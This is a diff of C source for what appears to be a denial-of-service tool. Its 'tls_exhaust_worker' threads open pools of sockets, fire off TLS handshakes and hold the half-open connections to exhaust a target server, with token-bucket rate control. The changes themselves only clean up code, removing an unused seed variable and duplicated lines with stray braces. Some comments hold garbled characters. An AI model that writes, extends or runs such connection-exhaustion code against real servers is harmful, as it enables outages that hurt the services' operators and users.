@@ -59,7 +59,8 @@ static int safe_sendmmsg(int fd, struct mmsghdr *msgvec, unsigned int vlen, int 
 
 /* Ã¢â€â‚¬Ã¢â€â‚¬ Token Bucket Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */
 static void tb_init(TokenBucket *tb, double r, double b) {
-    if (r < 1) r = 1; if (b < r) b = r;
+    if (r < 1) r = 1;
+    if (b < r) b = r;
     tb->rate = r; tb->burst = b; tb->tokens = b;
     clock_gettime(CLOCK_MONOTONIC, &tb->last);
     pthread_mutex_init(&tb->mtx, NULL);
@@ -259,7 +260,6 @@ static void *tls_exhaust_worker(void *arg) {
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
     time_t start = time(NULL);
-    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
     int *socks = calloc(TLS_POOL, sizeof(int));
     SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
     if (!ctx || !socks) { free(socks); if (ctx) SSL_CTX_free(ctx); return NULL; }
@@ -288,12 +288,6 @@ static void *tls_exhaust_worker(void *arg) {
             SSL_connect(ssl);  /* fire and forget — handshake pkt sent to kernel */
             SSL_free(ssl);     /* TCP socket stays alive independently */
 
-            socks[pool] = s;
-            pool++;
-            pkt_sent(512);
-        }
-            }
-            /* Keep connection Ã¢â‚¬â€ mid-handshake or partial */
             socks[pool] = s;
             pool++;
             pkt_sent(512);
